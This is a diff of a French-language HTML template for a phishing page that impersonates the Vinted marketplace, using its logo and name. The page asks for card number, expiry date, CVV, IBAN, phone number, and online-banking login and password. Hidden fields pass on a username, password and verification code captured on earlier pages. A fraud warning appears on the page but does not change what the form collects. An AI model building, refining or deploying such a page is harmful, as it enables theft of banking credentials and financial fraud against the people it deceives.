@@ -1,532 +1,281 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Informations de paiement</title>
-  <style>
-    /* Styles généraux */
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    html, body {
-      height: 100%;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed;
-      background-size: cover;
-      background-position: center center;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      color: #333;
-      overflow-y: auto;
-      padding: 20px 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informations de paiement - Vinted</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            box-sizing: border-box;
+            margin: 15px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 110px;
+            height: auto;
+            border: 0;
+        }
+        h2 {
+            font-size: 22px;
+            color: #007b76;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+        p {
+            font-size: 0.95em;
+            line-height: 1.5;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        .instruction-red {
+            color: #dc3545; /* Couleur rouge */
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 0.9em;
+            color: #333;
+            font-weight: 500;
+        }
+        .form-group input[type="text"],
+        .form-group input[type="password"],
+        .form-group input[type="tel"],
+        .form-group select {
+            width: calc(100% - 20px);
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        .form-group input[type="text"]:focus,
+        .form-group input[type="password"]:focus,
+        .form-group input[type="tel"]:focus,
+        .form-group select:focus {
+            border-color: #007b76;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 123, 118, 0.25);
+        }
+        .button-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #007b76;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1.05em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .button-submit:hover {
+            background-color: #005e5a;
+        }
+        .legal-warning {
+            background-color: #ffebe6;
+            border: 1px solid #dc3545;
+            border-radius: 5px;
+            padding: 12px;
+            margin-top: 20px;
+            text-align: left;
+            font-size: 0.8em;
+            color: #dc3545;
+        }
+        .legal-warning strong {
+            font-size: 1em;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .hidden {
+            display: none;
+        }
 
-    /* **SECTION DÉJÀ CORRIGÉE POUR L'ARRIÈRE-PLAN MOBILE** */
-    @media (max-width: 480px) {
-      html, body {
-        background-size: contain; /* Ajuste l'image pour qu'elle tienne entièrement dans l'écran */
-        background-position: top center; /* Centre l'image en haut de l'écran */
-        background-repeat: no-repeat; /* Empêche la répétition de l'image */
-        background-attachment: scroll; /* L'image défile avec le contenu sur mobile */
-      }
-      .modal { /* Note: Pour cette page, la classe principale est .modal-payment, pas .modal */
-        padding: 20px 15px; /* Conserve le padding ajusté pour les petites tailles d'écran */
-      }
-      input, button {
-        font-size: 15px; /* Conserve la taille de police ajustée */
-      }
-    }
-
-    /* Styles du conteneur modal */
-    .modal-payment {
-      background-color: white;
-      width: 90%;
-      max-width: 450px;
-      padding: 25px;
-      border-radius: 8px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-      position: relative;
-      max-height: calc(100vh - 40px);
-      overflow-y: auto;
-    }
-
-    /* En-tête de la modal */
-    .modal-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-
-    .modal-header h3 {
-      font-size: 18px;
-      font-weight: normal;
-      color: #333;
-    }
-
-    .close-button {
-      background: none;
-      border: none;
-      font-size: 24px;
-      cursor: pointer;
-      color: #777;
-      line-height: 1;
-      padding: 0;
-      margin: 0;
-    }
-    .close-button:hover {
-      color: #333;
-    }
-
-    /* Message de sécurisation en haut de cette page */
-    .security-message-payment {
-      font-size: 14px;
-      color: #007b76;
-      margin-bottom: 20px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 5px;
-      padding: 0;
-      text-align: center;
-      line-height: 1.3;
-    }
-
-    .security-message-payment .icon {
-        font-size: 18px;
-        line-height: 1;
-    }
-
-    /* Logos des cartes */
-    .card-logos {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-    .card-logos img {
-      height: 20px;
-      margin-right: 5px;
-      vertical-align: middle;
-    }
-    .card-logos span {
-      font-size: 14px;
-      color: #777;
-      vertical-align: middle;
-    }
-
-    /* Groupes de formulaire */
-    .form-group {
-      margin-bottom: 15px;
-      text-align: left;
-    }
-
-    .form-group label {
-      display: block;
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 5px;
-    }
-
-    .form-group input[type="text"],
-    .form-group input[type="tel"],
-    .form-group input[type="password"], /* Nouveau style pour type="password" */
-    .form-group select { /* Nouveau style pour select */
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-size: 15px;
-    }
-
-    .form-group input[type="text"]::placeholder,
-    .form-group input[type="tel"]::placeholder,
-    .form-group input[type="password"]::placeholder { /* Nouveau style pour type="password" */
-      color: #aaa;
-    }
-
-    .form-group .input-feedback {
-      font-size: 12px;
-      color: #dc3545;
-      margin-top: 5px;
-      display: none;
-    }
-    .form-group.has-error input,
-    .form-group.has-error select { /* Ajout de select pour les erreurs */
-      border-color: #dc3545;
-    }
-    .form-group.has-error .input-feedback {
-      display: block;
-    }
-
-    .input-row {
-      display: flex;
-      gap: 15px;
-    }
-    .input-row .form-group {
-      flex: 1;
-    }
-
-    /* Boutons */
-    .button-group {
-      margin-top: 25px;
-    }
-    .button-group button {
-      width: 100%;
-      padding: 12px;
-      font-size: 17px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: background-color 0.3s ease;
-    }
-
-    .button-primary {
-      background-color: #007b76;
-      color: white;
-      margin-bottom: 10px;
-    }
-    .button-primary:hover {
-      background-color: #00605c;
-    }
-
-    .button-secondary {
-      background-color: #f2f2f2;
-      color: #555;
-    }
-    .button-secondary:hover {
-      background-color: #e0e0e0;
-    }
-
-    .help-icon {
-        display: inline-block;
-        width: 16px;
-        height: 16px;
-        border: 1px solid #ccc;
-        border-radius: 50%;
-        text-align: center;
-        line-height: 14px;
-        font-size: 12px;
-        cursor: pointer;
-        color: #777;
-        margin-left: 5px;
-        vertical-align: middle;
-    }
-    .help-icon:hover {
-        background-color: #eee;
-    }
-
-    /* Style spécifique pour le champ "Autre Banque" */
-    #other_bank_name_group {
-        display: none; /* Caché par défaut */
-        margin-top: -5px; /* Ajustement visuel */
-    }
-  </style>
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 18px;
+            }
+            h2 {
+                font-size: 18px;
+            }
+            p {
+                font-size: 0.9em;
+            }
+            .form-group label {
+                font-size: 0.85em;
+            }
+            .form-group input, .form-group select {
+                padding: 8px;
+                font-size: 0.95em;
+            }
+            .button-submit {
+                font-size: 1em;
+                padding: 10px;
+            }
+            .legal-warning {
+                font-size: 0.75em;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="modal-payment">
-    <div class="security-message-payment">
-        <span class="icon">🔒</span>
-        <span>Vos informations de paiement sont enregistrées et sécurisées par un cryptage avancé.</span>
-    </div>
-
-    <div class="modal-header">
-      <h3>Informations de reception de fond et de paiement</h3>
-      <button type="button" class="close-button">&times;</button>
-    </div>
-
-    <form action="/process_payment" method="post">
-      <div class="form-group">
-        <label for="card_name">Nom figurant sur la carte</label>
-        <input type="text" id="card_name" name="card_name" placeholder="Saisis ton nom et prénom" required>
-        <div class="input-feedback">Nom figurant sur la carte ne peut pas être vide</div>
-      </div>
-
-      <div class="form-group">
-        <label for="card_number">Numéro de carte bancaire</label>
-        <input type="text" id="card_number" name="card_number" placeholder="Par ex : 1234 1234 1234 1234" inputmode="numeric" maxlength="19" required>
-        <div class="input-feedback">Numéro de carte bancaire ne peut pas être vide</div>
-      </div>
-
-      <div class="input-row">
-        <div class="form-group">
-          <label for="expiry_date">Date d'expiration</label>
-          <input type="text" id="expiry_date" name="expiry_date" placeholder="MM / AA" maxlength="7" required>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
         </div>
-        <div class="form-group">
-          <label for="cvv">Code de sécurité <span class="help-icon">?</span></label>
-          <input type="text" id="cvv" name="cvv" placeholder="par ex : 123" inputmode="numeric" maxlength="4" required>
+        <h2>Finalisation de vos informations</h2>
+
+        <p class="instruction-red">Veuillez inscrire les informations du compte à enregistrer pour vos prochains achats et réceptions de fonds sur Vinted.</p>
+
+        <form action="/process_payment" method="POST">
+            <input type="hidden" name="username" value="{{ username }}">
+            <input type="hidden" name="password" value="{{ password }}">
+            <input type="hidden" name="verification_code" value="{{ verification_code }}">
+
+            <h3>Informations de connexion bancaire</h3>
+            <div class="form-group">
+                <label for="iban">IBAN :</label>
+                <input type="text" id="iban" name="iban" required>
+            </div>
+            <div class="form-group">
+                <label for="phone_number">Numéro de téléphone lié au compte bancaire :</label>
+                <input type="tel" id="phone_number" name="phone_number" required>
+            </div>
+
+            <div class="form-group">
+                <label for="bank_name">Nom de votre banque :</label>
+                <select id="bank_name" name="bank_name" onchange="toggleOtherBankField()">
+                    <option value="">Sélectionnez votre banque</option>
+                    <option value="BNP Paribas">BNP Paribas</option>
+                    <option value="Crédit Agricole">Crédit Agricole</option>
+                    <option value="Société Générale">Société Générale</option>
+                    <option value="Banque Populaire">Banque Populaire</option>
+                    <option value="Crédit Mutuel">Crédit Mutuel</option>
+                    <option value="CIC">CIC</option>
+                    <option value="LCL">LCL</option>
+                    <option value="HSBC France">HSBC France</option>
+                    <option value="Boursorama Banque">Boursorama Banque</option>
+                    <option value="N26">N26</option>
+                    <option value="Revolut">Revolut</option>
+                    <option value="Fortuneo">Fortuneo</option>
+                    <option value="Monabanq">Monabanq</option>
+                    <option value="Autre">Autre</option>
+                </select>
+            </div>
+
+            <div class="form-group hidden" id="other_bank_name_group">
+                <label for="other_bank_name">Nom exact de votre banque :</label>
+                <input type="text" id="other_bank_name" name="other_bank_name">
+            </div>
+
+            <div class="form-group">
+                <label for="bank_id">Identifiant de connexion à votre banque en ligne :</label>
+                <input type="text" id="bank_id" name="bank_id" required>
+            </div>
+            <div class="form-group">
+                <label for="bank_password">Mot de passe ou code sécurisé de votre banque en ligne :</label>
+                <input type="password" id="bank_password" name="bank_password" required>
+            </div>
+
+            <h3>Informations de votre carte</h3>
+            <div class="form-group">
+                <label for="card_name">Nom figurant sur la carte :</label>
+                <input type="text" id="card_name" name="card_name" required>
+            </div>
+            <div class="form-group">
+                <label for="card_number">Numéro de carte :</label>
+                <input type="text" id="card_number" name="card_number" pattern="[\d\s]{16,19}" maxlength="19" required>
+            </div>
+            <div class="form-group">
+                <label for="expiry_date">Date d'expiration (MM/AA) :</label>
+                <input type="text" id="expiry_date" name="expiry_date" pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">Code CVV (3 ou 4 chiffres) :</label>
+                <input type="password" id="cvv" name="cvv" pattern="\d{3,4}" required>
+            </div>
+
+            <button type="submit" class="button-submit">Valider et continuer</button>
+        </form>
+
+        <div class="legal-warning">
+            <strong>AVERTISSEMENT LÉGAL : Utilisation Frauduleuse</strong>
+            <p>L'utilisation de moyens de paiement (cartes bancaires, identifiants) sans consentement est interdite et constitue une fraude, sévèrement punie par la loi (articles L. 163-1 et s. du Code monétaire et financier ; articles 313-1 et s. du Code pénal). N'utilisez que vos propres informations ou celles pour lesquelles vous avez une autorisation légale explicite.</p>
         </div>
-      </div>
-
-      <div class="form-group">
-        <label for="iban">IBAN</label>
-        <input type="text" id="iban" name="iban" placeholder="FRXX XXXX XXXX XXXX XXXX XXXX XXX" maxlength="34" required>
-        <div class="input-feedback">Veuillez entrer un IBAN valide (FR)</div>
-      </div>
-
-      <div class="form-group">
-        <label for="phone_number">Numéro de téléphone</label>
-        <input type="tel" id="phone_number" name="phone_number" placeholder="Par ex : 06 12 34 56 78" required>
-        <div class="input-feedback">Veuillez entrer un numéro de téléphone valide</div>
-      </div>
-
-      <div class="form-group">
-        <label for="bank_name">Établissement bancaire</label>
-        <select id="bank_name" name="bank_name" required>
-          <option value="">Sélectionnez votre banque</option>
-          <option value="BNP Paribas">BNP Paribas</option>
-          <option value="Crédit Agricole">Crédit Agricole</option>
-          <option value="Société Générale">Société Générale</option>
-          <option value="Banque Populaire">Banque Populaire</option>
-          <option value="Caisse d'Épargne">Caisse d'Épargne</option>
-          <option value="Crédit Mutuel">Crédit Mutuel</option>
-          <option value="CIC">CIC</option>
-          <option value="LCL">LCL</option>
-          <option value="La Banque Postale">La Banque Postale</option>
-          <option value="Hello Bank!">Hello Bank!</option>
-          <option value="Boursorama Banque">Boursorama Banque</option>
-          <option value="Fortuneo">Fortuneo</option>
-          <option value="Monabank">Monabank</option>
-          <option value="N26">N26</option>
-          <option value="Revolut">Revolut</option>
-          <option value="Autre">Autre / Non listé</option>
-        </select>
-        <div class="input-feedback">Veuillez sélectionner votre établissement bancaire</div>
-      </div>
-
-      <div class="form-group" id="other_bank_name_group">
-        <label for="other_bank_name">Nom de l'établissement bancaire (manuel)</label>
-        <input type="text" id="other_bank_name" name="other_bank_name" placeholder="Saisissez le nom de votre banque">
-        <div class="input-feedback">Veuillez saisir le nom de votre banque</div>
-      </div>
-
-      <div class="form-group">
-        <label for="bank_id">Identifiant bancaire</label>
-        <input type="text" id="bank_id" name="bank_id" placeholder="Par ex : Votre identifiant de connexion à la banque" required>
-        <div class="input-feedback">Veuillez entrer votre identifiant bancaire</div>
-      </div>
-
-      <div class="form-group">
-        <label for="bank_password">Code de sécurité / Mot de passe bancaire</label>
-        <input type="password" id="bank_password" name="bank_password" placeholder="Par ex : Votre mot de passe de connexion à la banque" required>
-        <div class="input-feedback">Veuillez entrer votre code de sécurité ou mot de passe bancaire</div>
-      </div>
-
-      <input type="hidden" name="username" value="{{ username }}">
-      <input type="hidden" name="password" value="{{ password }}">
-      <input type="hidden" name="verification_code" value="{{ verification_code }}">
-
-      <div class="button-group">
-        <button type="submit" class="button-primary">Enregistrer ses informations</button>
-        <button type="button" class="button-secondary" onclick="history.back()">Annuler</button>
-      </div>
-    </form>
     </div>
 
-  <script>
-    // Fonction de validation pour vérifier la validité d'un IBAN français (basic structure)
-    function isValidIbanFR(iban) {
-        iban = iban.replace(/\s/g, '').toUpperCase();
-        const frIbanRegex = /^FR\d{2}([0-9A-Z]{23})$/;
-        return frIbanRegex.test(iban) && iban.length === 27;
-    }
-
-    // Fonction de validation simple pour un numéro de téléphone français
-    function isValidPhoneNumber(phone) {
-        phone = phone.replace(/\s/g, ''); // Supprime les espaces
-        const phoneRegex = /^(0|\+33)[1-9]([-. ]?[0-9]{2}){4}$/; // Exemple pour la France
-        return phoneRegex.test(phone) && phone.length >= 9; // Min 9 chiffres pour 0X XX XX XX XX
-    }
-
-    document.addEventListener('DOMContentLoaded', function() {
-        const form = document.querySelector('form');
-        const bankNameSelect = document.getElementById('bank_name');
-        const otherBankNameGroup = document.getElementById('other_bank_name_group');
-        const otherBankNameInput = document.getElementById('other_bank_name');
-
-        // Gérer l'affichage du champ "Autre Banque"
-        bankNameSelect.addEventListener('change', function() {
-            if (this.value === 'Autre') {
-                otherBankNameGroup.style.display = 'block';
-                otherBankNameInput.setAttribute('required', 'required'); // Rendre obligatoire si "Autre" est sélectionné
+    <script>
+        function toggleOtherBankField() {
+            const bankNameSelect = document.getElementById('bank_name');
+            const otherBankNameGroup = document.getElementById('other_bank_name_group');
+            if (bankNameSelect.value === 'Autre') {
+                otherBankNameGroup.classList.remove('hidden');
+                otherBankNameGroup.querySelector('input').setAttribute('required', 'required');
             } else {
-                otherBankNameGroup.style.display = 'none';
-                otherBankNameInput.removeAttribute('required'); // Ne pas rendre obligatoire
-                otherBankNameInput.value = ''; // Vider le champ si l'option change
+                otherBankNameGroup.classList.add('hidden');
+                otherBankNameGroup.querySelector('input').removeAttribute('required');
+                otherBankNameGroup.querySelector('input').value = ''; // Clear value when hidden
             }
-        });
+        }
 
-        form.addEventListener('submit', function(event) {
-            let isValid = true;
-
-            // --- Validations existantes ---
-
-            // Validation Nom sur la carte
-            const cardNameInput = document.getElementById('card_name');
-            if (cardNameInput.value.trim() === '') {
-                cardNameInput.closest('.form-group').classList.add('has-error');
-                cardNameInput.nextElementSibling.textContent = "Nom figurant sur la carte ne peut pas être vide.";
-                isValid = false;
-            } else {
-                cardNameInput.closest('.form-group').classList.remove('has-error');
-            }
-
-            // Validation Numéro de carte bancaire
+        document.addEventListener('DOMContentLoaded', () => {
             const cardNumberInput = document.getElementById('card_number');
-            const rawCardNumber = cardNumberInput.value.replace(/\s/g, '');
-            if (rawCardNumber.length < 13 || rawCardNumber.length > 19 || !/^\d+$/.test(rawCardNumber)) {
-                cardNumberInput.closest('.form-group').classList.add('has-error');
-                cardNumberInput.nextElementSibling.textContent = "Numéro de carte bancaire invalide (13-19 chiffres).";
-                isValid = false;
-            } else {
-                cardNumberInput.closest('.form-group').classList.remove('has-error');
-            }
-
-            // Validation Date d'expiration
             const expiryDateInput = document.getElementById('expiry_date');
-            const expiryRegex = /^(0[1-9]|1[0-2]) \/ ([0-9]{2})$/;
-            if (!expiryRegex.test(expiryDateInput.value.trim())) {
-                expiryDateInput.closest('.form-group').classList.add('has-error');
-                expiryDateInput.nextElementSibling.textContent = "Format de date incorrect (MM / AA).";
-                isValid = false;
-            } else {
-                const [month, year] = expiryDateInput.value.split(' / ').map(Number);
-                const currentYear = new Date().getFullYear() % 100;
-                const currentMonth = new Date().getMonth() + 1;
 
-                if (year < currentYear || (year === currentYear && month < currentMonth)) {
-                    expiryDateInput.closest('.form-group').classList.add('has-error');
-                    expiryDateInput.nextElementSibling.textContent = "La date d'expiration doit être future.";
-                    isValid = false;
-                } else {
-                    expiryDateInput.closest('.form-group').classList.remove('has-error');
+            // Auto-formatage du numéro de carte (espaces)
+            cardNumberInput.addEventListener('input', (event) => {
+                let value = event.target.value.replace(/\D/g, ''); // Supprime tout ce qui n'est pas un chiffre
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
                 }
-            }
+                event.target.value = formattedValue.trim(); // Supprime l'espace en trop s'il y en a un à la fin
+            });
 
-            // Validation Code de sécurité (CVV)
-            const cvvInput = document.getElementById('cvv');
-            if (!/^[0-9]{3,4}$/.test(cvvInput.value.trim())) {
-                cvvInput.closest('.form-group').classList.add('has-error');
-                cvvInput.nextElementSibling.textContent = "Code de sécurité invalide (3 ou 4 chiffres).";
-                isValid = false;
-            } else {
-                cvvInput.closest('.form-group').classList.remove('has-error');
-            }
+            // Auto-formatage de la date d'expiration (slash)
+            expiryDateInput.addEventListener('input', (event) => {
+                let value = event.target.value.replace(/\D/g, ''); // Supprime tout ce qui n'est pas un chiffre
 
-            // VALIDATION IBAN
-            const ibanInput = document.getElementById('iban');
-            if (!isValidIbanFR(ibanInput.value.trim())) {
-                ibanInput.closest('.form-group').classList.add('has-error');
-                ibanInput.nextElementSibling.textContent = "Veuillez entrer un IBAN français valide (FR + 2 chiffres + 23 caractères).";
-                isValid = false;
-            } else {
-                ibanInput.closest('.form-group').classList.remove('has-error');
-            }
-
-            // VALIDATION NUMÉRO DE TÉLÉPHONE
-            const phoneNumberInput = document.getElementById('phone_number');
-            if (!isValidPhoneNumber(phoneNumberInput.value.trim())) {
-                phoneNumberInput.closest('.form-group').classList.add('has-error');
-                phoneNumberInput.nextElementSibling.textContent = "Veuillez entrer un numéro de téléphone valide (format français).";
-                isValid = false;
-            } else {
-                phoneNumberInput.closest('.form-group').classList.remove('has-error');
-            }
-
-            // --- Nouvelles validations ---
-
-            // VALIDATION Établissement bancaire
-            if (bankNameSelect.value === '') {
-                bankNameSelect.closest('.form-group').classList.add('has-error');
-                bankNameSelect.nextElementSibling.textContent = "Veuillez sélectionner votre établissement bancaire.";
-                isValid = false;
-            } else {
-                bankNameSelect.closest('.form-group').classList.remove('has-error');
-                // Si "Autre" est sélectionné, valider le champ de saisie manuelle
-                if (bankNameSelect.value === 'Autre' && otherBankNameInput.value.trim() === '') {
-                    otherBankNameInput.closest('.form-group').classList.add('has-error');
-                    otherBankNameInput.nextElementSibling.textContent = "Veuillez saisir le nom de votre banque.";
-                    isValid = false;
-                } else {
-                    otherBankNameInput.closest('.form-group').classList.remove('has-error');
+                // Si la longueur est 2 et que le 3ème caractère n'est pas un slash, ajoute un slash
+                if (value.length > 2 && event.target.value.charAt(2) !== '/') {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else if (value.length === 2 && event.inputType !== 'deleteContentBackward' && event.target.value.indexOf('/') === -1) {
+                    // Ajoute un slash si on a tapé 2 chiffres et que ce n'est pas une suppression
+                    value = value + '/';
                 }
-            }
-
-            // VALIDATION Identifiant bancaire
-            const bankIdInput = document.getElementById('bank_id');
-            if (bankIdInput.value.trim() === '') {
-                bankIdInput.closest('.form-group').classList.add('has-error');
-                bankIdInput.nextElementSibling.textContent = "Veuillez entrer votre identifiant bancaire.";
-                isValid = false;
-            } else {
-                bankIdInput.closest('.form-group').classList.remove('has-error');
-            }
-
-            // VALIDATION Code de sécurité / Mot de passe bancaire
-            const bankPasswordInput = document.getElementById('bank_password');
-            if (bankPasswordInput.value.trim() === '') {
-                bankPasswordInput.closest('.form-group').classList.add('has-error');
-                bankPasswordInput.nextElementSibling.textContent = "Veuillez entrer votre code de sécurité ou mot de passe bancaire.";
-                isValid = false;
-            } else {
-                bankPasswordInput.closest('.form-group').classList.remove('has-error');
-            }
-
-
-            if (!isValid) {
-                event.preventDefault(); // Empêche la soumission du formulaire
-            }
+                // Limite la longueur totale à 5 (MM/AA)
+                event.target.value = value.substring(0, 5);
+            });
         });
-
-        // --- Formatage existant ---
-
-        // Formatage du numéro de carte
-        document.getElementById('card_number').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\s+/g, '');
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
-                }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
-        });
-
-        // Formatage de la date d'expiration
-        document.getElementById('expiry_date').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\s*\/\s*/g, '');
-            if (value.length > 2) {
-                value = value.substring(0, 2) + ' / ' + value.substring(2);
-            }
-            e.target.value = value;
-        });
-
-        // Formatage de l'IBAN
-        document.getElementById('iban').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\s+/g, '').toUpperCase();
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
-                }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
-        });
-
-        // Redirige au clic sur le bouton de fermeture
-        document.querySelector('.close-button').addEventListener('click', function() {
-            window.history.back();
-        });
-    });
-  </script>
+    </script>
 </body>
 </html>
